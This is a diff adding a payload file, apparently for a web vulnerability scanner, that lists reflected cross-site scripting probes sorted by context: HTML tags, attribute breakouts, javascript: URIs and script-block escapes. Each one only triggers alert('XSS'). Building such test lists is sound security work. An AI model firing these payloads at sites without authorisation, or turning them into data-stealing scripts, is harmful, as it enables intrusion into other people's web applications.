@@ -1,0 +1,22 @@
+# Reflected XSS payloads
+# One payload per line; lines starting with # are comments; blank lines are ignored.
+# Injected after canary reflection is confirmed.
+
+# --- HTML tag injection (body context) ---
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+
+# --- Attribute breakout (attribute context) ---
+" onfocus=alert('XSS') autofocus="
+' onfocus=alert('XSS') autofocus='
+"><script>alert('XSS')</script>
+
+# --- JavaScript URI (href/src attribute context) ---
+javascript:alert('XSS')
+
+# --- Script context (inside <script> block) ---
+';alert('XSS')//
+\';alert('XSS')//
